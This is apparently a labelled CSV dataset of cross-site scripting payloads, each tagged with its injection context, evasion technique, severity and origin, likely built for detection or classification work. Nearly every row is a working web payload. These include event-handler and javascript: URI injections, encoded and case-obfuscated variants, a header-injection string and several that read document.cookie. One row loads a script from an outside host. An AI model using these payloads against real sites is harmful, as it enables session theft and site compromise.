payload,context,technique,severity,length,source
eval('al'+'ert'+'(12)');//,dom_sink,encoding,high,26,real
"<multicol onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</multicol>",event_handler,none,medium,71,real
<body oninput=javascript:alert(1)><input autofocus>,event_handler,none,medium,51,real
"<menuitem onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</menuitem>",event_handler,none,medium,76,real
"<style>:target {transform: rotate(180deg);}</style><animatetransform id=x style=""transition:transform 2s"" ontransitionrun=print()></animatetransform>",event_handler,none,low,149,real
"<mark onclick=""alert(1)"" style=display:block>AnonKryptiQuz</mark>",event_handler,none,medium,65,real
"<dd onmouseup=""alert(1)"">AnonKryptiQuz</dd>",event_handler,none,medium,43,real
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert(9411);+ADw-/SCRIPT+AD4-",event_handler,case_variation,medium,126,real
<button popovertarget=x>Click me</button><ruby onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</ruby>,event_handler,none,medium,104,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dialog id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dialog>",event_handler,none,medium,182,real
%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE,generic,url_encoding,medium,159,real
"<sub onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</sub>",event_handler,none,medium,59,real
"""><svg onclick=consol&#101;.log(docum&#101;nt.cooki&#101;)>",tag_injection,synthetic,medium,59,synthetic
<svG oNloAd=ConFirM(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,35,synthetic
"<a href=""\x18javascript:javascript:alert(8404)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
' onbegin=console.log('XSS') ',attribute_escape,synthetic,medium,30,synthetic
<thead onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</thead>,event_handler,none,medium,76,real
"<svg onmouseover=""alert(1)"">AnonKryptiQuz</svg>",event_handler,none,medium,47,real
"&lt;STYLE&gt;li {list-style-image&#58; url(\""javascript&#058;alert('XSS')\"");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS",generic,html_entity,medium,115,real
"<video onclick=""alert(1)"" style=display:block>AnonKryptiQuz</video>",event_handler,none,medium,67,real
<ruby onpointermove=alert(1) style=display:block>AnonKryptiQuz</ruby>,event_handler,none,medium,69,real
"<rt draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</rt>",event_handler,none,medium,62,real
<source contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,60,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tr id=x style=""position:absolute;"" onanimationcancel=""print()""></tr>",event_handler,none,low,173,real
"<param onclick=""alert(1)"" style=display:block>AnonKryptiQuz</param>",event_handler,none,medium,67,real
""" onerror=console.log(1) """,attribute_escape,synthetic,medium,26,synthetic
"<;IMG SRC="";jav&#x09;ascript:alert(';XSS';);"";>;",attribute_escape,html_entity|whitespace_obfuscation,medium,48,real
feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>,js_uri,none,high,114,real
<button popovertarget=x>Click me</button><summary ontoggle=alert(1) popover id=x>AnonKryptiQuz</summary>,event_handler,none,medium,104,real
"<hr oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",event_handler,none,medium,67,real
"<tr onclick=""alert(1)"">AnonKryptiQuz</tr>",event_handler,none,medium,41,real
%3Csvg onload=prompt(1)%3E,tag_injection,synthetic,medium,26,synthetic
<svG oNclIck=alErt(doCumEnt.coOkiE)/>,tag_injection,synthetic,medium,37,synthetic
"<a href=""javascript\x00:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
<object onerror=javascript:javascript:alert(7032)>,event_handler,none,medium,50,real
"<style>@keyframes slidein {}</style><style style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></style>",event_handler,none,medium,164,real
<svG oNloAd=AleRt(DocUmeNt.CooKie)>,tag_injection,synthetic,medium,35,synthetic
"<img src=x onerror=\x09""javascript:alert(1)"">",event_handler,none,medium,45,real
"""><svg onlo&#97;d=prompt('XSS')>",tag_injection,synthetic,medium,32,synthetic
"<style>:target {color: red;}</style><thead id=x style=""transition:color 10s"" ontransitioncancel=print()></thead>",event_handler,none,low,112,real
<legend onpointerover=alert(1) style=display:block>AnonKryptiQuz</legend>,event_handler,none,medium,73,real
"""'><img src=xxx:x \x22onerror=javascript:alert(6701)>",event_handler,none,medium,53,real
"<style>:target {transform: rotate(180deg);}</style><element id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></element>",event_handler,none,medium,132,real
<dd id=x tabindex=1 onbeforedeactivate=alert(1)></dd><input autofocus>,event_handler,none,medium,70,real
"<param ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</param>",event_handler,none,medium,91,real
"<label onmouseleave=""alert(1)"">AnonKryptiQuz</label>",event_handler,none,medium,52,real
"<div draggable=""true"" contenteditable>drag me</div><meter ondragover=alert(1) contenteditable style=display:block>drop here</meter>",event_handler,none,medium,131,real
<ins onpointerenter=alert(1) style=display:block>AnonKryptiQuz</ins>,event_handler,none,medium,68,real
<svg onfocus=console.log(%27XSS%27)>,tag_injection,synthetic,medium,36,synthetic
"<center draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</center>",event_handler,none,medium,88,real
"<object data=""javascript:alert(AnonKryptiQuz)"">",js_uri,none,medium,47,real
"<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",event_handler,none,medium,84,real
"<a onmouseover=""alert(document.cookie)"">xxs link</a>",event_handler,none,high,52,real
"<th onmousemove=""alert(1)"">AnonKryptiQuz</th>",event_handler,none,medium,45,real
"<param onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</param>",event_handler,none,medium,68,real
"<html onclick=""alert(1)"">AnonKryptiQuz</html>",event_handler,none,medium,45,real
"<data onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</data>",event_handler,none,medium,84,real
<listing onpointerout=alert(1) style=display:block>AnonKryptiQuz</listing>,event_handler,none,medium,74,real
"<li onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</li>",event_handler,none,medium,77,real
<abbr onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</abbr>,event_handler,none,medium,74,real
"<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(8273)""></iframe onbeforeload>",event_handler,none,medium,99,real
javascr	ipt:void(alert(location.hash)),js_uri,synthetic,medium,38,synthetic
"<img/src/onerror=""(function(x){this[x+`ert`](1)})`al`"">",event_handler,none,low,55,real
"""%3E%3Csvg onmouseenter=prompt(document.domain)%3E",tag_injection,synthetic,medium,50,synthetic
<button popovertarget=x>Click me</button><li onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</li>,event_handler,none,medium,100,real
<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.,event_handler,none,medium,75,real
<menuitem onpointerenter=alert(1) style=display:block>AnonKryptiQuz</menuitem>,event_handler,none,medium,78,real
<svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>,event_handler,none,medium,65,real
?path=%2500%27onmouseover=%27window.stop();alert(document.domain)%27,event_handler,url_encoding,medium,68,real
<a onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</a>,event_handler,none,medium,68,real
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,script_injection,case_variation,low,48,real
<caption onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</caption><input value=clickme>,event_handler,none,medium,105,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><font id=x style=""position:absolute;"" onanimationcancel=""print()""></font>",event_handler,none,low,177,real
"""><svg onmous&#101;ov&#101;r=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,69,synthetic
%3Cscript%3Eprompt`document.domain`%3C/script%3E,script_injection,synthetic,medium,48,synthetic
""" onmouseover=prompt('XSS') """,attribute_escape,synthetic,medium,29,synthetic
<table onpointerup=alert(1) style=display:block>AnonKryptiQuz</table>,event_handler,none,medium,69,real
"<style>@keyframes slidein {}</style><progress style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></progress>",event_handler,none,medium,176,real
<rt onfocusout=alert(1) tabindex=1 id=x></rt><input autofocus>,event_handler,none,medium,62,real
"<kbd onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</kbd>",event_handler,none,medium,67,real
"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationstart=""alert(1)""></small>",event_handler,none,medium,97,real
<svg ontoggle=confirm(%27XSS%27)>,tag_injection,synthetic,medium,33,synthetic
(function(a){alert(1)}).call(),generic,none,medium,30,real
"<img onload=alert(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,medium,50,synthetic
"<style>@keyframes slidein {}</style><main style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></main>",event_handler,none,medium,168,real
"<a href=""\xE2\x80\xAFjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,79,real
"<hr onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</hr>",event_handler,none,medium,59,real
"<style>:target {color:red;}</style><colgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></colgroup>",event_handler,none,medium,114,real
"<svg onerror=console.log(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,medium,57,synthetic
JavAscRipT:cOnsOle.loG(lOcaTioN.hAsh),js_uri,synthetic,medium,37,synthetic
"<style>@keyframes x{}</style><multicol style=""animation-name:x"" onanimationstart=""alert(1)""></multicol>",event_handler,none,medium,103,real
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",event_handler,none,low,58,real
"<hr onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</hr>",event_handler,none,medium,62,real
"<video><source onerror=""alert.constructor.constructor('return this')().alert('‏0f')"">",event_handler,none,medium,85,real
<div onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</div>,event_handler,none,medium,72,real
"<data draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</data>",event_handler,none,medium,61,real
"<style>@keyframes x{}</style><img style=""animation-name:x"" onanimationend=""alert(1)""></img>",event_handler,none,medium,91,real
%3Csvg onmouseover=prompt(location.hash)%3E,tag_injection,synthetic,medium,43,synthetic
"<colgroup draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</colgroup>",event_handler,none,medium,92,real
{{$el.innerHTML='\u003cimg src onerror=alert(1)\u003e'}},event_handler,unicode_escape,medium,56,real
"<address onmouseout=""alert(1)"">AnonKryptiQuz</address>",event_handler,none,medium,54,real
""" oNclIck=coNfiRm(LocAtiOn.HasH) """,attribute_escape,synthetic,medium,34,synthetic
"<style>:target {color:red;}</style><em id=x style=""transition:color 1s"" ontransitionend=alert(1)></em>",event_handler,none,medium,102,real
"document.write(""<img src=x onerror=prompt(String.fromCharCode(88,83,83))>"")",dom_sink,synthetic,medium,75,synthetic
"<object src=1 href=1 onerror=""javascript:alert(6149)""></object>",event_handler,none,medium,63,real
"<footer draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</footer>",event_handler,none,medium,70,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><time id=x style=""position:absolute;"" onanimationcancel=""print()""></time>",event_handler,none,low,177,real
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onwebkitanimationend=""alert(1)""></audio>",event_handler,none,medium,101,real
"<noframes oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,101,real
"""><svg onmous&#101;&#101;nt&#101;r=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,82,synthetic
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",event_handler,none,medium,84,real
"""><Svg onBegIn=ConSolE.lOg('XSS')>",tag_injection,synthetic,medium,34,synthetic
<map id=x tabindex=1 ondeactivate=alert(1)></map><input id=y autofocus>,event_handler,none,medium,71,real
""" onclick=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,58,synthetic
<div onpointerout=alert(1) style=display:block>AnonKryptiQuz</div>,event_handler,none,medium,66,real
document.body.innerHTML=document.body.innerText,dom_sink,none,low,47,real
"""><svg onclick=alert('XSS')>",tag_injection,synthetic,medium,28,synthetic
"<dir onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</dir>",event_handler,none,medium,67,real
"<style onmousedown=""alert(1)"">AnonKryptiQuz</style>",event_handler,none,medium,51,real
'href=javascript:alert()>click me<a/y=',js_uri,none,medium,39,real
"<base draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</base>",event_handler,none,medium,66,real
%27 onmouseover=prompt(document.domain) %27,attribute_escape,synthetic,medium,43,synthetic
"<style>:target {color:red;}</style><em id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></em>",event_handler,none,medium,108,real
"<svG oNmoUseEntEr=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection,synthetic,medium,62,synthetic
"<menuitem draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</menuitem>",event_handler,none,medium,94,real
<image id=x tabindex=1 onfocus=alert(1)></image>,event_handler,none,medium,48,real
"<noscript onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</noscript>",event_handler,none,medium,78,real
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>,js_uri,case_variation,medium,114,real
"<kbd id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></kbd>",event_handler,none,medium,82,real
"<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>",event_handler,none,medium,114,real
"<dl onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</dl>",event_handler,none,medium,60,real
%3csvg/onload=window%5b%22al%22+%22ert%22%5d1337`%3e,event_handler,url_encoding,low,52,real
<colgroup onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,59,real
"<div draggable=""true"" contenteditable>drag me</div><canvas ondragover=alert(1) contenteditable style=display:block>drop here</canvas>",event_handler,none,medium,133,real
"<var oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,97,real
%script%alert(CAnonKryptiQuz¢)4/script%,generic,none,medium,39,real
"<nobr onmouseleave=""alert(1)"">AnonKryptiQuz</nobr>",event_handler,none,medium,50,real
"<canvas onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</canvas>",event_handler,none,medium,69,real
""" ontoggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,72,synthetic
<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>,script_injection,url_encoding,low,119,real
"document.write(""<img src=x onerror=console.log('XSS')>"")",dom_sink,synthetic,medium,56,synthetic
<textarea id=x tabindex=1 onbeforedeactivate=alert(1)></textarea><input autofocus>,event_handler,none,medium,82,real
"<font onmouseout=""alert(1)"">AnonKryptiQuz</font>",event_handler,none,medium,48,real
<IMG SRC='javascript:alert('AnonKryptiQuz');'>,js_uri,case_variation,medium,46,real
"setTimeout(""console.log(document.cookie)"",0)",dom_sink,synthetic,medium,44,synthetic
"<ins draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</ins>",event_handler,none,medium,59,real
<x/onxxx=1,event_handler,none,low,10,real
"""><svg onmouseover=prompt(document.cookie)>",tag_injection,synthetic,medium,43,synthetic
<footer id=x tabindex=1 onbeforeactivate=alert(1)></footer>,event_handler,none,medium,59,real
"<style draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</style>",event_handler,none,medium,88,real
